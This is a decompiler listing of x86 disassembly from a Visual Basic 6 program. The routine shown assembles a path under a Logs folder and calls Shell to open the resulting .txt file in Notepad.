00747E22: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00747E27: mov var_00000398, 008F529Ch
00747E31: jmp 747E3Dh
00747E33: mov var_00000398, 008F529Ch
00747E3D: mov eax, var_00000398
00747E43: mov eax, [eax]
00747E45: mov var_00000320, eax
00747E4B: lea eax, var_34
00747E4E: push eax
00747E4F: mov eax, var_00000320
00747E55: mov eax, [eax]
00747E57: push var_00000320
00747E5D: call [eax+14h]
00747E60: fclex 
00747E62: mov var_00000324, eax
00747E68: cmp var_00000324, 00000000h
00747E6F: jnl 747E91h
00747E71: push 00000014h
00747E73: push 00440F1Ch
00747E78: push var_00000320
00747E7E: push var_00000324
00747E84: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747E89: mov var_0000039C, eax
00747E8F: jmp 747E98h
00747E91: and var_0000039C, 00000000h
00747E98: mov eax, var_34
00747E9B: mov var_00000328, eax
00747EA1: lea eax, var_24
00747EA4: push eax
00747EA5: mov eax, var_00000328
00747EAB: mov eax, [eax]
00747EAD: push var_00000328
00747EB3: call [eax+50h]
00747EB6: fclex 
00747EB8: mov var_0000032C, eax
00747EBE: cmp var_0000032C, 00000000h
00747EC5: jnl 747EE7h
00747EC7: push 00000050h
00747EC9: push 00440F3Ch
00747ECE: push var_00000328
00747ED4: push var_0000032C
00747EDA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747EDF: mov var_000003A0, eax
00747EE5: jmp 747EEEh
00747EE7: and var_000003A0, 00000000h
00747EEE: mov var_0000027C, 00000007h
00747EF8: mov var_00000284, 00000003h
00747F02: cmp [008F2770h], 00000000h
00747F09: jnz 747F26h
00747F0B: push 008F2770h
00747F10: push 0041CD38h
00747F15: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00747F1A: mov var_000003A4, 008F2770h
00747F24: jmp 747F30h
00747F26: mov var_000003A4, 008F2770h
00747F30: push 004412DCh
00747F35: push 00000000h
00747F37: push 0000000Dh
00747F39: mov eax, var_000003A4
00747F3F: mov eax, [eax]
00747F41: mov ecx, var_000003A4
00747F47: mov ecx, [ecx]
00747F49: mov ecx, [ecx]
00747F4B: push eax
00747F4C: call [ecx+0000032Ch]
00747F52: push eax
00747F53: lea eax, var_38
00747F56: push eax
00747F57: call 00410A84h ; Set (object)
00747F5C: push eax
00747F5D: lea eax, var_000000E4
00747F63: push eax
00747F64: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00747F69: add esp, 00000010h
00747F6C: push eax
00747F6D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00747F72: push eax
00747F73: lea eax, var_3C
00747F76: push eax
00747F77: call 00410A84h ; Set (object)
00747F7C: mov var_00000330, eax
00747F82: lea eax, var_28
00747F85: push eax
00747F86: mov eax, var_00000330
00747F8C: mov eax, [eax]
00747F8E: push var_00000330
00747F94: call [eax+4Ch]
00747F97: fclex 
00747F99: mov var_00000334, eax
00747F9F: cmp var_00000334, 00000000h
00747FA6: jnl 747FC8h
00747FA8: push 0000004Ch
00747FAA: push 004412DCh
00747FAF: push var_00000330
00747FB5: push var_00000334
00747FBB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747FC0: mov var_000003A8, eax
00747FC6: jmp 747FCFh
00747FC8: and var_000003A8, 00000000h
00747FCF: mov eax, var_28
00747FD2: mov var_00000368, eax
00747FD8: and var_28, 00000000h
00747FDC: mov eax, var_00000368
00747FE2: mov var_000000FC, eax
00747FE8: mov var_00000104, 00000008h
00747FF2: cmp [008F2010h], 00000000h
00747FF9: jnz 748016h
00747FFB: push 008F2010h
00748000: push 00433984h
00748005: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074800A: mov var_000003AC, 008F2010h
00748014: jmp 748020h
00748016: mov var_000003AC, 008F2010h
00748020: push 00000010h
00748022: pop eax
00748023: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00748028: lea esi, var_00000284
0074802E: mov edi, esp
00748030: movsd 
00748031: movsd 
00748032: movsd 
00748033: movsd 
00748034: push 00000001h
00748036: push 00000010h
00748038: push 00440E58h
0074803D: push 00000010h
0074803F: pop eax
00748040: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00748045: lea esi, var_00000104
0074804B: mov edi, esp
0074804D: movsd 
0074804E: movsd 
0074804F: movsd 
00748050: movsd 
00748051: push 00000001h
00748053: push 00000000h
00748055: push 00440E48h
0074805A: push 00000000h
0074805C: push 00000018h
0074805E: mov eax, var_000003AC
00748064: mov eax, [eax]
00748066: mov ecx, var_000003AC
0074806C: mov ecx, [ecx]
0074806E: mov ecx, [ecx]
00748070: push eax
00748071: call [ecx+00000550h]
00748077: push eax
00748078: lea eax, var_40
0074807B: push eax
0074807C: call 00410A84h ; Set (object)
00748081: push eax
00748082: lea eax, var_000000F4
00748088: push eax
00748089: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074808E: add esp, 00000010h
00748091: push eax
00748092: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748097: push eax
00748098: lea eax, var_44
0074809B: push eax
0074809C: call 00410A84h ; Set (object)
007480A1: push eax
007480A2: lea eax, var_00000114
007480A8: push eax
007480A9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007480AE: add esp, 00000020h
007480B1: push eax
007480B2: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007480B7: push eax
007480B8: lea eax, var_48
007480BB: push eax
007480BC: call 00410A84h ; Set (object)
007480C1: push eax
007480C2: lea eax, var_00000124
007480C8: push eax
007480C9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007480CE: add esp, 00000020h
007480D1: mov var_000002BC, 00000006h
007480DB: mov var_000002C4, 00000003h
007480E5: cmp [008F2770h], 00000000h
007480EC: jnz 748109h
007480EE: push 008F2770h
007480F3: push 0041CD38h
007480F8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007480FD: mov var_000003B0, 008F2770h
00748107: jmp 748113h
00748109: mov var_000003B0, 008F2770h
00748113: push 004412DCh
00748118: push 00000000h
0074811A: push 0000000Dh
0074811C: mov eax, var_000003B0
00748122: mov eax, [eax]
00748124: mov ecx, var_000003B0
0074812A: mov ecx, [ecx]
0074812C: mov ecx, [ecx]
0074812E: push eax
0074812F: call [ecx+0000032Ch]
00748135: push eax
00748136: lea eax, var_4C
00748139: push eax
0074813A: call 00410A84h ; Set (object)
0074813F: push eax
00748140: lea eax, var_00000164
00748146: push eax
00748147: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074814C: add esp, 00000010h
0074814F: push eax
00748150: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748155: push eax
00748156: lea eax, var_50
00748159: push eax
0074815A: call 00410A84h ; Set (object)
0074815F: mov var_00000338, eax
00748165: lea eax, var_2C
00748168: push eax
00748169: mov eax, var_00000338
0074816F: mov eax, [eax]
00748171: push var_00000338
00748177: call [eax+4Ch]
0074817A: fclex 
0074817C: mov var_0000033C, eax
00748182: cmp var_0000033C, 00000000h
00748189: jnl 7481ABh
0074818B: push 0000004Ch
0074818D: push 004412DCh
00748192: push var_00000338
00748198: push var_0000033C
0074819E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007481A3: mov var_000003B4, eax
007481A9: jmp 7481B2h
007481AB: and var_000003B4, 00000000h
007481B2: mov eax, var_2C
007481B5: mov var_0000036C, eax
007481BB: and var_2C, 00000000h
007481BF: mov eax, var_0000036C
007481C5: mov var_0000017C, eax
007481CB: mov var_00000184, 00000008h
007481D5: cmp [008F2010h], 00000000h
007481DC: jnz 7481F9h
007481DE: push 008F2010h
007481E3: push 00433984h
007481E8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007481ED: mov var_000003B8, 008F2010h
007481F7: jmp 748203h
007481F9: mov var_000003B8, 008F2010h
00748203: push 00000010h
00748205: pop eax
00748206: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074820B: lea esi, var_000002C4
00748211: mov edi, esp
00748213: movsd 
00748214: movsd 
00748215: movsd 
00748216: movsd 
00748217: push 00000001h
00748219: push 00000010h
0074821B: push 00440E58h
00748220: push 00000010h
00748222: pop eax
00748223: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00748228: lea esi, var_00000184
0074822E: mov edi, esp
00748230: movsd 
00748231: movsd 
00748232: movsd 
00748233: movsd 
00748234: push 00000001h
00748236: push 00000000h
00748238: push 00440E48h
0074823D: push 00000000h
0074823F: push 00000018h
00748241: mov eax, var_000003B8
00748247: mov eax, [eax]
00748249: mov ecx, var_000003B8
0074824F: mov ecx, [ecx]
00748251: mov ecx, [ecx]
00748253: push eax
00748254: call [ecx+00000550h]
0074825A: push eax
0074825B: lea eax, var_54
0074825E: push eax
0074825F: call 00410A84h ; Set (object)
00748264: push eax
00748265: lea eax, var_00000174
0074826B: push eax
0074826C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00748271: add esp, 00000010h
00748274: push eax
00748275: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074827A: push eax
0074827B: lea eax, var_58
0074827E: push eax
0074827F: call 00410A84h ; Set (object)
00748284: push eax
00748285: lea eax, var_00000194
0074828B: push eax
0074828C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00748291: add esp, 00000020h
00748294: push eax
00748295: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074829A: push eax
0074829B: lea eax, var_5C
0074829E: push eax
0074829F: call 00410A84h ; Set (object)
007482A4: push eax
007482A5: lea eax, var_000001A4
007482AB: push eax
007482AC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007482B1: add esp, 00000020h
007482B4: push 004412DCh
007482B9: push 00000000h
007482BB: push 0000000Dh
007482BD: mov eax, [ebp+08h]
007482C0: mov eax, [eax]
007482C2: push [ebp+08h]
007482C5: call [eax+0000032Ch]
007482CB: push eax
007482CC: lea eax, var_60
007482CF: push eax
007482D0: call 00410A84h ; Set (object)
007482D5: push eax
007482D6: lea eax, var_000001E4
007482DC: push eax
007482DD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007482E2: add esp, 00000010h
007482E5: push eax
007482E6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007482EB: push eax
007482EC: lea eax, var_64
007482EF: push eax
007482F0: call 00410A84h ; Set (object)
007482F5: mov var_00000340, eax
007482FB: lea eax, var_30
007482FE: push eax
007482FF: mov eax, var_00000340
00748305: mov eax, [eax]
00748307: push var_00000340
0074830D: call [eax+4Ch]
00748310: fclex 
00748312: mov var_00000344, eax
00748318: cmp var_00000344, 00000000h
0074831F: jnl 748341h
00748321: push 0000004Ch
00748323: push 004412DCh
00748328: push var_00000340
0074832E: push var_00000344
00748334: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00748339: mov var_000003BC, eax
0074833F: jmp 748348h
00748341: and var_000003BC, 00000000h
00748348: push var_30
0074834B: call 004109DCh ; Val(arg_1)
00748350: fstp real8 ptr var_0000031C
00748356: push 00000020h
00748358: lea eax, var_00000214
0074835E: push eax
0074835F: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
00748364: mov var_0000022C, 0044BA20h ; notepad
0074836E: mov var_00000234, 00000008h
00748378: mov eax, var_24
0074837B: mov var_00000370, eax
00748381: and var_24, 00000000h
00748385: mov eax, var_00000370
0074838B: mov var_0000008C, eax
00748391: mov var_00000094, 00000008h
0074839B: mov var_0000023C, 0044A818h ; \Logs\
007483A5: mov var_00000244, 00000008h
007483AF: mov eax, [8F23B4h]
007483B4: mov var_0000024C, eax
007483BA: mov var_00000254, 00000008h
007483C4: mov var_0000025C, 00441B28h
007483CE: mov var_00000264, 00000008h
007483D8: lea eax, var_00000124
007483DE: push eax
007483DF: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007483E4: mov var_0000012C, eax
007483EA: mov var_00000134, 00000008h
007483F4: mov var_0000029C, 004495B0h
007483FE: mov var_000002A4, 00000008h
00748408: lea eax, var_000001A4
0074840E: push eax
0074840F: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00748414: mov var_000001AC, eax
0074841A: mov var_000001B4, 00000008h
00748424: mov var_000002DC, 0044A82Ch
0074842E: mov var_000002E4, 00000008h
00748438: fld real8 ptr var_0000031C
0074843E: call 00410814h ; msvbvm60.dll.__vbaFpI4
00748443: push eax
00748444: push [008F2074h]
0074844A: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074844F: mov eax, [eax]
00748451: mov var_000002EC, eax
00748457: mov var_000002F4, 00000008h
00748461: mov var_000002FC, 0044A834h ; .txt
0074846B: mov var_00000304, 00000008h
00748475: push 00000001h
00748477: lea eax, var_00000234
0074847D: push eax
0074847E: lea eax, var_74
00748481: push eax
00748482: lea eax, var_00000084
00748488: push eax
00748489: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074848E: push eax
0074848F: lea eax, var_00000094
00748495: push eax
00748496: lea eax, var_000000A4
0074849C: push eax
0074849D: call 004109F4h ; msvbvm60.dll.__vbaVarCat
007484A2: push eax
007484A3: lea eax, var_00000244
007484A9: push eax
007484AA: lea eax, var_000000B4
007484B0: push eax
007484B1: call 004109F4h ; msvbvm60.dll.__vbaVarCat
007484B6: push eax
007484B7: lea eax, var_00000254
007484BD: push eax
007484BE: lea eax, var_000000C4
007484C4: push eax
007484C5: call 004109F4h ; msvbvm60.dll.__vbaVarCat
007484CA: push eax
007484CB: lea eax, var_00000264
007484D1: push eax
007484D2: lea eax, var_000000D4
007484D8: push eax
007484D9: call 004109F4h ; msvbvm60.dll.__vbaVarCat
007484DE: push eax
007484DF: lea eax, var_00000134
007484E5: push eax
007484E6: lea eax, var_00000144
007484EC: push eax
007484ED: call 004109F4h ; msvbvm60.dll.__vbaVarCat
007484F2: push eax
007484F3: lea eax, var_000002A4
007484F9: push eax
007484FA: lea eax, var_00000154
00748500: push eax
00748501: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748506: push eax
00748507: lea eax, var_000001B4
0074850D: push eax
0074850E: lea eax, var_000001C4
00748514: push eax
00748515: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074851A: push eax
0074851B: lea eax, var_000002E4
00748521: push eax
00748522: lea eax, var_000001D4
00748528: push eax
00748529: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074852E: push eax
0074852F: lea eax, var_000002F4
00748535: push eax
00748536: lea eax, var_000001F4
0074853C: push eax
0074853D: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748542: push eax
00748543: lea eax, var_00000304
00748549: push eax
0074854A: lea eax, var_00000204
00748550: push eax
00748551: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00748556: push eax
00748557: lea eax, var_00000214
0074855D: push eax
0074855E: lea eax, var_00000224
00748564: push eax
00748565: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074856A: push eax
0074856B: call 00410A96h ; Shell
00748570: fstp real8 ptr var_00000314
00748576: lea ecx, var_30
00748579: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074857E: lea eax, var_64
00748581: push eax
00748582: lea eax, var_60
00748585: push eax
00748586: lea eax, var_5C
00748589: push eax
0074858A: lea eax, var_58
0074858D: push eax
0074858E: lea eax, var_54
00748591: push eax
00748592: lea eax, var_50
00748595: push eax
00748596: lea eax, var_4C
00748599: push eax
0074859A: lea eax, var_48
0074859D: push eax
0074859E: lea eax, var_44
007485A1: push eax
007485A2: lea eax, var_40
007485A5: push eax
007485A6: lea eax, var_3C
007485A9: push eax
007485AA: lea eax, var_38
007485AD: push eax
007485AE: lea eax, var_34
007485B1: push eax
007485B2: push 0000000Dh
007485B4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007485B9: add esp, 00000038h
007485BC: lea eax, var_00000224
007485C2: push eax
007485C3: lea eax, var_00000214
007485C9: push eax
007485CA: lea eax, var_00000204
007485D0: push eax
007485D1: lea eax, var_000001F4
007485D7: push eax
007485D8: lea eax, var_000001D4
007485DE: push eax
007485DF: lea eax, var_000001E4
007485E5: push eax
007485E6: lea eax, var_000001C4
007485EC: push eax
007485ED: lea eax, var_000001B4
007485F3: push eax
007485F4: lea eax, var_00000154
007485FA: push eax
007485FB: lea eax, var_000001A4
00748601: push eax
00748602: lea eax, var_00000194
00748608: push eax
00748609: lea eax, var_00000184
0074860F: push eax
00748610: lea eax, var_00000174
00748616: push eax
00748617: lea eax, var_00000164
0074861D: push eax
0074861E: lea eax, var_00000144
00748624: push eax
00748625: lea eax, var_00000134
0074862B: push eax
0074862C: lea eax, var_000000D4
00748632: push eax
00748633: lea eax, var_00000124
00748639: push eax
0074863A: lea eax, var_00000114
00748640: push eax
00748641: lea eax, var_00000104
00748647: push eax
00748648: lea eax, var_000000F4
0074864E: push eax
0074864F: lea eax, var_000000E4
00748655: push eax
00748656: lea eax, var_000000C4
0074865C: push eax
0074865D: lea eax, var_000000B4
00748663: push eax
00748664: lea eax, var_000000A4
0074866A: push eax
0074866B: lea eax, var_00000094
00748671: push eax
00748672: lea eax, var_00000084
00748678: push eax
00748679: lea eax, var_74
0074867C: push eax
0074867D: push 0000001Ch
0074867F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00748684: add esp, 00000074h
00748687: jmp 00748EB7h
0074868C: mov var_04, 00000006h
00748693: push 00000020h
00748695: lea eax, var_74
00748698: push eax
00748699: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
0074869E: cmp [008F529Ch], 00000000h
007486A5: jnz 7486C2h
007486A7: push 008F529Ch
007486AC: push 00440F2Ch
007486B1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007486B6: mov var_000003C0, 008F529Ch
007486C0: jmp 7486CCh
007486C2: mov var_000003C0, 008F529Ch
007486CC: mov eax, var_000003C0
007486D2: mov eax, [eax]
007486D4: mov var_00000320, eax
007486DA: lea eax, var_34
007486DD: push eax
007486DE: mov eax, var_00000320
007486E4: mov eax, [eax]
007486E6: push var_00000320
007486EC: call [eax+14h]
007486EF: fclex 
007486F1: mov var_00000324, eax
007486F7: cmp var_00000324, 00000000h
007486FE: jnl 748720h
00748700: push 00000014h
00748702: push 00440F1Ch
00748707: push var_00000320
0074870D: push var_00000324
00748713: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00748718: mov var_000003C4, eax
0074871E: jmp 748727h
00748720: and var_000003C4, 00000000h
00748727: mov eax, var_34
0074872A: mov var_00000328, eax
00748730: lea eax, var_24
00748733: push eax
00748734: mov eax, var_00000328
0074873A: mov eax, [eax]
0074873C: push var_00000328
00748742: call [eax+50h]
00748745: fclex 
00748747: mov var_0000032C, eax
0074874D: cmp var_0000032C, 00000000h
00748754: jnl 748776h
00748756: push 00000050h
00748758: push 00440F3Ch
0074875D: push var_00000328
00748763: push var_0000032C
00748769: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074876E: mov var_000003C8, eax
00748774: jmp 74877Dh
00748776: and var_000003C8, 00000000h
0074877D: mov var_0000025C, 00000007h
00748787: mov var_00000264, 00000003h
00748791: cmp [008F2770h], 00000000h
00748798: jnz 7487B5h
0074879A: push 008F2770h
0074879F: push 0041CD38h
007487A4: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007487A9: mov var_000003CC, 008F2770h
007487B3: jmp 7487BFh
007487B5: mov var_000003CC, 008F2770h
007487BF: push 004412DCh
007487C4: push 00000000h
007487C6: push 0000000Dh
007487C8: mov eax, var_000003CC
007487CE: mov eax, [eax]
007487D0: mov ecx, var_000003CC
007487D6: mov ecx, [ecx]
007487D8: mov ecx, [ecx]
007487DA: push eax
007487DB: call [ecx+0000032Ch]
007487E1: push eax
007487E2: lea eax, var_38
007487E5: push eax
007487E6: call 00410A84h ; Set (object)
007487EB: push eax
007487EC: lea eax, var_000000C4
007487F2: push eax
007487F3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007487F8: add esp, 00000010h
007487FB: push eax
007487FC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748801: push eax
00748802: lea eax, var_3C
00748805: push eax
00748806: call 00410A84h ; Set (object)
0074880B: mov var_00000330, eax
00748811: lea eax, var_28
00748814: push eax
00748815: mov eax, var_00000330
0074881B: mov eax, [eax]
0074881D: push var_00000330
00748823: call [eax+4Ch]
00748826: fclex 
00748828: mov var_00000334, eax
0074882E: cmp var_00000334, 00000000h
00748835: jnl 748857h
00748837: push 0000004Ch
00748839: push 004412DCh
0074883E: push var_00000330
00748844: push var_00000334
0074884A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074884F: mov var_000003D0, eax
00748855: jmp 74885Eh
00748857: and var_000003D0, 00000000h
0074885E: mov eax, var_28
00748861: mov var_00000374, eax
00748867: and var_28, 00000000h
0074886B: mov eax, var_00000374
00748871: mov var_000000DC, eax
00748877: mov var_000000E4, 00000008h
00748881: cmp [008F2010h], 00000000h
00748888: jnz 7488A5h
0074888A: push 008F2010h
0074888F: push 00433984h
00748894: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00748899: mov var_000003D4, 008F2010h
007488A3: jmp 7488AFh
007488A5: mov var_000003D4, 008F2010h
007488AF: push 00000010h
007488B1: pop eax
007488B2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007488B7: lea esi, var_00000264
007488BD: mov edi, esp
007488BF: movsd 
007488C0: movsd 
007488C1: movsd 
007488C2: movsd 
007488C3: push 00000001h
007488C5: push 00000010h
007488C7: push 00440E58h
007488CC: push 00000010h
007488CE: pop eax
007488CF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007488D4: lea esi, var_000000E4
007488DA: mov edi, esp
007488DC: movsd 
007488DD: movsd 
007488DE: movsd 
007488DF: movsd 
007488E0: push 00000001h
007488E2: push 00000000h
007488E4: push 00440E48h
007488E9: push 00000000h
007488EB: push 00000018h
007488ED: mov eax, var_000003D4
007488F3: mov eax, [eax]
007488F5: mov ecx, var_000003D4
007488FB: mov ecx, [ecx]
007488FD: mov ecx, [ecx]
007488FF: push eax
00748900: call [ecx+00000550h]
00748906: push eax
00748907: lea eax, var_40
0074890A: push eax
0074890B: call 00410A84h ; Set (object)
00748910: push eax
00748911: lea eax, var_000000D4
00748917: push eax
00748918: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074891D: add esp, 00000010h
00748920: push eax
00748921: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748926: push eax
00748927: lea eax, var_44
0074892A: push eax
0074892B: call 00410A84h ; Set (object)
00748930: push eax
00748931: lea eax, var_000000F4
00748937: push eax
00748938: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074893D: add esp, 00000020h
00748940: push eax
00748941: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748946: push eax
00748947: lea eax, var_48
0074894A: push eax
0074894B: call 00410A84h ; Set (object)
00748950: push eax
00748951: lea eax, var_00000104
00748957: push eax
00748958: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074895D: add esp, 00000020h
00748960: mov var_0000029C, 00000006h
0074896A: mov var_000002A4, 00000003h
00748974: cmp [008F2770h], 00000000h
0074897B: jnz 748998h
0074897D: push 008F2770h
00748982: push 0041CD38h
00748987: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074898C: mov var_000003D8, 008F2770h
00748996: jmp 7489A2h
00748998: mov var_000003D8, 008F2770h
007489A2: push 004412DCh
007489A7: push 00000000h
007489A9: push 0000000Dh
007489AB: mov eax, var_000003D8
007489B1: mov eax, [eax]
007489B3: mov ecx, var_000003D8
007489B9: mov ecx, [ecx]
007489BB: mov ecx, [ecx]
007489BD: push eax
007489BE: call [ecx+0000032Ch]
007489C4: push eax
007489C5: lea eax, var_4C
007489C8: push eax
007489C9: call 00410A84h ; Set (object)
007489CE: push eax
007489CF: lea eax, var_00000144
007489D5: push eax
007489D6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007489DB: add esp, 00000010h
007489DE: push eax
007489DF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007489E4: push eax
007489E5: lea eax, var_50
007489E8: push eax
007489E9: call 00410A84h ; Set (object)
007489EE: mov var_00000338, eax
007489F4: lea eax, var_2C
007489F7: push eax
007489F8: mov eax, var_00000338
007489FE: mov eax, [eax]
00748A00: push var_00000338
00748A06: call [eax+4Ch]
00748A09: fclex 
00748A0B: mov var_0000033C, eax
00748A11: cmp var_0000033C, 00000000h
00748A18: jnl 748A3Ah
00748A1A: push 0000004Ch
00748A1C: push 004412DCh
00748A21: push var_00000338
00748A27: push var_0000033C
00748A2D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00748A32: mov var_000003DC, eax
00748A38: jmp 748A41h
00748A3A: and var_000003DC, 00000000h
00748A41: mov eax, var_2C
00748A44: mov var_00000378, eax
00748A4A: and var_2C, 00000000h
00748A4E: mov eax, var_00000378
00748A54: mov var_0000015C, eax
00748A5A: mov var_00000164, 00000008h
00748A64: cmp [008F2010h], 00000000h
00748A6B: jnz 748A88h
00748A6D: push 008F2010h
00748A72: push 00433984h
00748A77: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00748A7C: mov var_000003E0, 008F2010h
00748A86: jmp 748A92h
00748A88: mov var_000003E0, 008F2010h
00748A92: push 00000010h
00748A94: pop eax
00748A95: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00748A9A: lea esi, var_000002A4
00748AA0: mov edi, esp
00748AA2: movsd 
00748AA3: movsd 
00748AA4: movsd 
00748AA5: movsd 
00748AA6: push 00000001h
00748AA8: push 00000010h
00748AAA: push 00440E58h
00748AAF: push 00000010h
00748AB1: pop eax
00748AB2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00748AB7: lea esi, var_00000164
00748ABD: mov edi, esp
00748ABF: movsd 
00748AC0: movsd 
00748AC1: movsd 
00748AC2: movsd 
00748AC3: push 00000001h
00748AC5: push 00000000h
00748AC7: push 00440E48h
00748ACC: push 00000000h
00748ACE: push 00000018h
00748AD0: mov eax, var_000003E0
00748AD6: mov eax, [eax]
00748AD8: mov ecx, var_000003E0
00748ADE: mov ecx, [ecx]
00748AE0: mov ecx, [ecx]
00748AE2: push eax
00748AE3: call [ecx+00000550h]
00748AE9: push eax
00748AEA: lea eax, var_54
00748AED: push eax
00748AEE: call 00410A84h ; Set (object)
00748AF3: push eax
00748AF4: lea eax, var_00000154
00748AFA: push eax
00748AFB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00748B00: add esp, 00000010h
00748B03: push eax
00748B04: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748B09: push eax
00748B0A: lea eax, var_58
00748B0D: push eax
00748B0E: call 00410A84h ; Set (object)
00748B13: push eax
00748B14: lea eax, var_00000174
00748B1A: push eax
00748B1B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00748B20: add esp, 00000020h
00748B23: push eax
00748B24: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748B29: push eax
00748B2A: lea eax, var_5C
00748B2D: push eax
00748B2E: call 00410A84h ; Set (object)
00748B33: push eax
00748B34: lea eax, var_00000184
00748B3A: push eax
00748B3B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00748B40: add esp, 00000020h
00748B43: push 004412DCh
00748B48: push 00000000h
00748B4A: push 0000000Dh
00748B4C: mov eax, [ebp+08h]
00748B4F: mov eax, [eax]
00748B51: push [ebp+08h]
00748B54: call [eax+0000032Ch]
00748B5A: push eax
00748B5B: lea eax, var_60
00748B5E: push eax
00748B5F: call 00410A84h ; Set (object)
00748B64: push eax
00748B65: lea eax, var_000001C4
00748B6B: push eax
00748B6C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00748B71: add esp, 00000010h
00748B74: push eax
00748B75: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00748B7A: push eax
00748B7B: lea eax, var_64
00748B7E: push eax
00748B7F: call 00410A84h ; Set (object)
00748B84: mov var_00000340, eax
00748B8A: lea eax, var_30
00748B8D: push eax
00748B8E: mov eax, var_00000340
00748B94: mov eax, [eax]
00748B96: push var_00000340
00748B9C: call [eax+4Ch]
00748B9F: fclex 
00748BA1: mov var_00000344, eax
00748BA7: cmp var_00000344, 00000000h
00748BAE: jnl 748BD0h
00748BB0: push 0000004Ch
00748BB2: push 004412DCh
00748BB7: push var_00000340
00748BBD: push var_00000344
00748BC3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00748BC8: mov var_000003E4, eax
00748BCE: jmp 748BD7h
00748BD0: and var_000003E4, 00000000h
00748BD7: push var_30
00748BDA: call 004109DCh ; Val(arg_1)
00748BDF: fstp real8 ptr var_0000031C
00748BE5: push 00000020h
00748BE7: lea eax, var_000001F4
00748BED: push eax
00748BEE: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
00748BF3: mov var_0000022C, 0044BA20h ; notepad
00748BFD: mov var_00000234, 00000008h
00748C07: mov eax, var_24
00748C0A: mov var_0000037C, eax
00748C10: and var_24, 00000000h
00748C14: mov eax, var_0000037C
00748C1A: mov var_0000008C, eax
00748C20: mov var_00000094, 00000008h
00748C2A: mov var_0000023C, 0044A818h ; \Logs\
00748C34: mov var_00000244, 00000008h
00748C3E: lea eax, var_00000104
00748C44: push eax
00748C45: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00748C4A: mov var_0000010C, eax
00748C50: mov var_00000114, 00000008h
00748C5A: mov var_0000027C, 004495B0h
00748C64: mov var_00000284, 00000008h
00748C6E: lea eax, var_00000184
00748C74: push eax
00748C75: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
